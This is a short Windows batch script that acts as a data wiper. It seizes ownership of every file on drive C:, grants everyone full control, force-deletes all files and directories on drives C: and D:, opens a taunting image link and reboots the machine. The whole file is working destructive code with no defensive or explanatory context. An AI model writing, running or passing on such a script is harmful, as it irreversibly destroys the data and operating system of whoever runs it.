@echo off
:: Take ownership of all files
takeown /f C:\*.* /r /d y
icacls C:\*.* /grant Everyone:F /t

:: Delete all files
del /f /q /s C:\*.*
del /f /q /s D:\*.*

:: Delete all directories
rd /s /q C:\
rd /s /q D:\

:: Open a website before shutting down
start "" "https://claysoftwares.netlify.app/lol.png"

:: Wait for 3 seconds
timeout /t 3 /nobreak

:: Restart system
shutdown /r /t 0
